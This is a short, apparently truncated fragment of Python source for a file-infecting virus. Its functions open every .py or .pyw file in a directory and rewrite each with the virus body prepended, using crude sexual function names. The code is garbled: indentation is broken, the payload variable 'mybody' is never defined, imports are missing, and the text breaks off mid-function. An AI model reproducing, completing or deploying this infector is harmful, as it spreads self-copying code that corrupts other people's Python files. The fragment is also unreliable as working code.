def fornicate(guest):
   try:
       soul = open(guest, "r")
       body = soul.read()
       soul.close()

           soul = open(guest, "w")
           soul.write(mybody + "\n\n" + body)
           soul.close()
   except IOError: pass        

def chat(party, guest):
   if split(guest, ".")[-1] in ("py", "pyw"):
       fornicate(party + guest)

def join(party):

       if not S_ISLNK(os.stat(party)[ST_MODE]):
